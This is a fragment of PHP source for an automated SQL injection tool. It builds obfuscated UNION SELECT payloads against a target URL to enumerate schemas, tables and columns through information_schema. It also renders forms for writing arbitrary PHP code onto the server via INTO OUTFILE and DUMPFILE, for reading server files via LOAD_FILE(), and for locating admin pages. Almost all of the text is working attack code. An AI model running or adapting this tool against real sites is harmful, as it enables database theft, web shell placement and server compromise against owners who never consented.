$o_tablenamef = "Table Name Enumeration Failed" . "<br />";
echo $o_tablenamef;
}
}
elseif ($foundtablecount[1] > 13)
{
$o_schema_table = "<br />"."<b>".$foundschemaname[1]." Table :"."</b>"."<br />";
echo $o_schema_table;
$start=0;
for($start;$start<$foundtablecount[1];++$start)
{
$tablev5query = "(Select aLl concat(concat(CHAR(104,51,120,58)),table_name,concat(CHAR(58,104,51,120))) from information_schema.tables where table_schema=0x".bin2hex($foundschemaname[1])." limit $start,1)";
$tv5query = str_replace(" ",$whitespace,$tablev5query);
$gettable = str_replace($cols,$tv5query,$bcols);
$tablev5 =  $url2 . $param . $whitespace . $unisel . $whitespace . $gettable .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($tablev5),$foundtable))
{
$o_table_limit = $foundschemaname[1]."."."<b>".$foundtable[1]."</b>". "<br />";
echo $o_table_limit;
$table[$start]=$foundtable[1];
$tv5 = true;
/*$o_table_limitf = null;*/
}
else
{
$o_table_limitf = "Table Enumeration failed , it may be empty";
echo $o_table_limitf;
/*$o_table_limit = null;*/
}
}
}
else
{
}

/*

Column Name Enumeration

*/

if($tv5==true)
{
echo "<br />","<b>", $foundschemaname[1]," Columns: ","</b>","<br />";
$num1=0;
for($num1;$num1<$tablecol;++$num1)
{
$columnv5query = "(Select aLl concat(CHAR(104,51,120,58),count(column_name),CHAR(58,104,51,120)) from information_schema.columns where table_name=0x".bin2hex($table[$num1])." and table_schema=0x".bin2hex($foundschemaname[1]).")";
$cv5query = str_replace(" ",$whitespace,$columnv5query);
$getcolumncnt = str_replace($cols,$cv5query,$bcols);
$columnsx =  $url2 . $param . $whitespace . $unisel . $whitespace . $getcolumncnt .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($columnsx),$colcnt))
{
$o_schema_table_columncnt = $foundschemaname[1]."."."<b>".$table[$num1]."</b>"." -> <b>".$colcnt[1]." column(s)</b>" . "<br />";
echo $o_schema_table_columncnt;
$colnum[$num1] = $colcnt[1];
$ccol=true;
$o_schema_table_columncntf = null;
}
}
}
else
{
$o_schema_table_columncntf = "Column Count Enumeration Failed" . "<br />";
echo $o_schema_table_columncntf;
$o_schema_table_columncnt = null;
}
}
}

/*

Column inside Schema.Table Enumeration

*/

if($ccol==true)
{
{
{
$o_column_table = "<br />"."<b>"."Column inside Table Enumeration"."</b>" . "<br />";
echo $o_column_table;
$countx=0;
for($countx;$countx<$tablecol;++$countx)
{
if($colnum[$countx]<=12)
{
$columnv5query = "(Select aLl concat(CHAR(104,51,120,58),group_concat(column_name),concat(CHAR(58,104,51,120))) from information_schema.columns where table_name=0x".bin2hex($table[$countx])." and table_schema=0x".bin2hex($foundschemaname[1]).")";
$cv5query = str_replace(" ",$whitespace,$columnv5query);
$getcolx = str_replace($cols,$cv5query,$bcols);

$columnxv5 =  $url2 . $param . $whitespace . $unisel . $whitespace . $getcolx .$comment[$rancom];

if(preg_match("/h3x:(.*?):h3x/s",geturl($columnxv5),$columnxs))
{
$column = explode(",",$columnxs[1]);
$lopp=0;
for($lopp;$lopp<$colnum[$countx];++$lopp)
{
$o_schema_table_column = $foundschemaname[1]."."."<b>".$table[$countx]."</b>"." -> "."<b>".$column[$lopp]."</b>"."<br />";
echo $o_schema_table_column;
/*$columnv5[$countx][$lopp]=$column[$lopp];*/
/*$alast=true;*/
/*$tdump= true;*/
}
$o_newline = "<br />";
echo $o_newline;
/*$cv5 = true;*/
$o_schema_table_column_limitf = null;
$o_schema_table_column_limit = null;
/*$txtdumpv5 = true;*/
}
}
elseif($colnum[$countx]>13)
{
for($de_loop=0;$de_loop<$colnum[$countx];++$de_loop)
{
$columnv5query = "(Select aLl concat(CHAR(104,51,120,58),concat(column_name),concat(CHAR(58,104,51,120))) from information_schema.columns where table_name=0x".bin2hex($table[$countx])." and table_schema=0x".bin2hex($foundschemaname[1])." limit $de_loop,1)";
$cv5query = str_replace(" ",$whitespace,$columnv5query);
$getcolx = str_replace($cols,$cv5query,$bcols);

$dataxv5 =  $url2 . $param . $whitespace . $unisel . $whitespace . $getcolx .$comment[$rancom];
/*echo $dataxv5 , "<br />";*/
if(preg_match("/h3x:(.*?):h3x/s",geturl($dataxv5),$dataxxs))
{
/*$dataxs[$countx]=$dataxxs[1];*/
$o_schema_table_column_limit = $foundschemaname[1]."."."<b>".$table[$countx]."</b>"." -> "."<b>". $dataxxs[1]."</b>". "<br />";
echo $o_schema_table_column_limit;
/*$alast=true;*/
/*$tdump= true;*/
/*$o_schema_table_column_limitf = null;
$o_schema_table_column = null;
*/
/*$cv5 = true;*/
/*$txtdumpv5 = true;*/
}
}
echo "<br />";
}
else
{
$o_schema_table_column_limitf = "Column Version 5 Enumeration Failed" . "<br />";
echo $o_schema_table_column_limitf;
$o_schema_table_column_limit = null;
$o_schema_table_column = null;
}
}
}
}
}
}
}


/*

Dump Function (v5)

*/
/*
if($txtdumpv5=true)
{

$datav5 = $o_urlx .$o_ccol.$o_strcol.$o_usr.$o_basedir.$o_basedirf.$o_datadir.$o_datadirf.$o_hostname.$o_hostnamef.$o_db.$o_dbf.$o_sqlv.$o_sqlv5.$o_sqlv4.$o_sqlv3.$o_sqlv_unk.$o_sqlv_beta.$o_sqlv_betaf.$o_schemacnt.$o_schemacntf.$o_schema[$schemastart].$o_sch_table.$o_tname.$o_tablename.$o_tablenamef.$o_table_limit.$o_table_limitf.$o_schema_table_columncnt.$o_schema_table_columncntf.$o_column_table.$o_schema_table_column.$o_newline.$o_schema_table_column_limit;
$dir = getcwd() . "/DumpV5/";
if(!$dir)
{
mkdir($dir,700);
}
chdir($dir);
$md5 = "[HexDV5]".md5($datav5).'.html';

$open = fopen($md5,"a+");
fwrite($open,$datav5);
fclose($open);

echo "<br />","File is saved as <a href=DumpV5/",$md5,">",$md5,"</a>","<br />";
}
*/

/*

Additional Tools

*/

echo "<br />","<b>Hexdumper</b> -- <b>Manual Data Dump</b>:","<br />";

echo '
<form action="Hexdumper.php" method="post" />
<b>Url</b>
<br />
<input type="text" name="url" size="127" value=http://localhost/sqliv.php?sqli=1337+union+select+1,2,hexon,4,5 />
<br />

<b>Table</b>
<br />
<input type="text" size="77"  name="table" value= "[Schema_name].[Table_name]" />
<br />

<b>Column</b>
<br />
<input type="text" size="77"  name="column" value= "[Column_name]" />
<br />

<input type="submit" name="submit" />
<br />
</form>
';

echo "<br />","<b>Hexdumpfile</b> -- <b>Manual Into DumpFile</b>:","<br />";

echo '
<form action="Hexdumpfile.php" method="post" />
<b>Url</b> (Replace all the columns that is not string column with null)
<br />
<input type="text" name="url" size="127" value=http://localhost/sqliv.php?sqli=1337+union+select+null,null,hexon,null,null />
<br />

<b>Code</b>
<br />
<textarea rows = 2 cols = 90 name="code"> Code to be inputted : 
Example :  <?php echo phpinfo(); ?>
</textarea>
<br />

<b>Path</b>
<br />
<input type="text" size="77"  name="path" value= "[C:/Folder/Filename.Extension]" />
<br />

<input type="submit" name="dumpfilesubmit" />
<br />
</form>
';

echo "<br />","<b>Hexoutfile</b> -- <b>Manual Into OutFile</b> :","<br />";

echo '
<form action="Hexoutfile.php" method="post" />
<b>Url</b> (Replace all the columns that is not string column with null)
<br />
<input type="text" name="url" size="127" value=http://localhost/sqliv.php?sqli=1337+union+select+null,null,hexon,null,null />
<br />

<b>Code</b>
<br />
<textarea rows = 2 cols = 90 name="code"> Code to be inputted : 
Example : <?php echo phpinfo(); ?>
</textarea>
<br />

<b>Path</b>
<br />
<input type="text" size="77"  name="path" value= "[C:/Folder/Filename.Extension]" />
<br />

<input type="submit" name="outfilesubmit" />
<br />
</form>
';

echo "<br />","<b>Hexloader</b> -- <b>Manual Load_File()</b>:","<br />";

echo '
<form action="Hexloader.php" method="post" />
<b>Url</b>
<br />
<input type="text" name="url" size="127" value=http://localhost/sqliv.php?sqli=1337+union+select+null,null,hexon,null,null />
<br />

<b>File to be loaded</b>
<br />
<input type="text" size="77"  name="Filename" value= "[Filename]" />
<br />

<input type="submit" name="loadfilesubmit" />
<br />
</form>
';
}


if(isset($_GET['injsubmit']))
{
/**/ob_start(null,3,true);/**/
/**/
$time_start = microtime(true);
/**/


if(include("Error_Check.php"))
{}
else
{
die("Error_Check.php -- Not Found");
}
geturlx($site);

echo "<br />";

Error_Check($site);
/**/
if($mysqli=true)
{
MySQL_Injection($site);
}
else
{
echo "Not MySQL Injection Type","<br />";
}
/**/
echo '
<b>Hexafind</b> -- <b>Admin Page Finder</b>
<br />
<form action="Hexafind.php" method="post" />
<b>Url</b>
<br />
<input type="text" name="url" size="127" value=http://localhost/ />
<br />

<input type="submit" name="admsubmit" />
<br />
</form>
';

$time_end = microtime(true);
$time = $time_end - $time_start;

echo "<b>Time Taken</b> = ",($time)," Seconds","<br />";

echo "<br />","<br />";

echo "Any <b>Suggestions</b>,<b>Ideas</b> or <b>Feedbacks</b>, <b>Email</b> to <b>shareyin@qq.com</b>";

ob_end_flush();
}

?>